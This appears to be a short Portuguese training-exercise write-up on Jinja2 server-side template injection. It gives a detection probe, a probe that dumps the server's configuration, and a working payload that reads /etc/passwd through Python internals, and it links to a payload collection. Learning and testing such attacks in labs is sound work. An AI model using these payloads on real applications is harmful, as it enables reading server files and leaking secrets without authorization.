## Módulo 01 / Exercício 00 - SSTI - Payloads

Ao verificar que os dados de entrada em uma página são refletidas automaticamente nela mesma, é uma indicação de uma possível vulnerabilidade por SSTI. 

Exemplo:

Informando o comando no campo de texto:

    {{ 7 * 5 }}

Caso a resposta seja 35. Surprise! Existe uma renderização no template!

Validando informações do servidor:

    {{ config }}

O script necessário para retornar a resposta esperada no exercício é o seguinte:

    {{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}



Exemplos de Payload:

    https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti









